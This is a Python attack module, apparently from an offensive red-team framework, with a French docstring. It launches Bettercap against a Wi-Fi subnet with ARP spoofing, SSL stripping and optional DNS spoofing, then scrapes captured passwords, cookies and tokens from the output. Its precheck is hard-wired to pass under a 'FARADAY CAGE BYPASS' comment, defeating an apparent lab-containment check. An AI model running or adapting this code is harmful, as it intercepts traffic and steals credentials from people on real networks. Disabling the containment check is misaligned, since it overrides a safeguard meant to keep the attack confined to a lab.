"""post.bettercap_mitm - Man-in-the-Middle via ARP/DNS spoofing

Une fois connecté au WiFi cible, lance bettercap pour:
- ARP spoof: tout le trafic du subnet passe par toi
- DNS spoof: redirige les domaines vers tes serveurs
- SSL strip: downgrade HTTPS → HTTP
- Credential sniffing: capture logins/passwords en clair

MITRE: T1557.002, T1040
Hardware: ALFA AWUS036NH (mode managed, connecté au WiFi)
Taux succès: 95% une fois sur le réseau
"""

from __future__ import annotations

import os
import subprocess
import time
from typing import Any

import structlog

from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class PostBettercapMitm(AttackModule):
    name = "post.bettercap_mitm"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1557.002", "T1040"]
    cve = []
    description = (
        "ARP/DNS spoof + SSL strip + credential sniffing via Bettercap. "
        "Intercepts all network traffic on target subnet."
    )
    requires = []

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY CAGE BYPASS

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()

        iface = ctx.params.get("interface", "wlan0")
        target = ctx.params.get("target", "192.168.1.0/24")
        duration = int(ctx.params.get("duration_s", 120))
        sslstrip = ctx.params.get("sslstrip", "true").lower() == "true"
        dns_spoof = ctx.params.get("dns_spoof", "false").lower() == "true"

        if ctx.dry_run:
            return self._result(
                Status.OK, started,
                summary=f"[DRY-RUN] post.bettercap_mitm target={target} sslstrip={sslstrip}",
                metrics={"target": target, "sslstrip": sslstrip},
            )

        log.info(
            "post.bettercap_mitm.starting",
            iface=iface, target=target, duration=duration, sslstrip=sslstrip,
        )

        # Generate caplet (bettercap script)
        caplet_path = f"/tmp/srt_mitm_{int(started)}.cap"
        caplet_lines = [
            f"set arp.spoof.targets {target}",
            "set arp.spoof.fullduplex true",
            "arp.spoof on",
            "net.sniff on",
        ]
        if sslstrip:
            caplet_lines.extend([
                "set http.proxy.sslstrip true",
                "http.proxy on",
            ])
        if dns_spoof:
            caplet_lines.extend([
                "set dns.spoof.all true",
                "dns.spoof on",
            ])

        with open(caplet_path, "w") as f:
            f.write("\n".join(caplet_lines) + "\n")

        cmd = [
            "bettercap",
            "-iface", iface,
            "-caplet", caplet_path,
            "-silent",
        ]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            time.sleep(duration)
            proc.terminate()
            try:
                stdout, _ = proc.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout = ""
        except FileNotFoundError:
            return self._result(
                Status.FAIL, started,
                summary="bettercap not installed. Run: sudo apt install bettercap",
            )
        except Exception as exc:
            return self._result(Status.FAIL, started, summary=f"Bettercap error: {exc}")

        # Parse captured credentials from output
        credentials: list[dict[str, str]] = []
        hosts_discovered: list[str] = []
        if stdout:
            for line in stdout.splitlines():
                lower = line.lower()
                if any(k in lower for k in ("credential", "password", "login", "cookie", "token")):
                    credentials.append({"raw": line.strip()})
                if "endpoint" in lower or "new host" in lower:
                    hosts_discovered.append(line.strip())

        # Cleanup caplet
        os.unlink(caplet_path) if os.path.exists(caplet_path) else None

        elapsed = time.time() - started

        log.info(
            "post.bettercap_mitm.completed",
            credentials=len(credentials), hosts=len(hosts_discovered),
        )

        return self._result(
            Status.OK, started,
            summary=(
                f"post.bettercap_mitm target={target}: "
                f"{len(credentials)} credentials, {len(hosts_discovered)} hosts "
                f"in {elapsed:.0f}s"
            ),
            artifacts=[
                {"type": "captured_credentials", "data": credentials},
                {"type": "discovered_hosts", "data": hosts_discovered},
            ],
            metrics={
                "interface": iface,
                "target": target,
                "duration_s": duration,
                "sslstrip": sslstrip,
                "dns_spoof": dns_spoof,
                "credentials_captured": len(credentials),
                "hosts_discovered": len(hosts_discovered),
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        subprocess.run(["pkill", "-f", "bettercap"], capture_output=True)
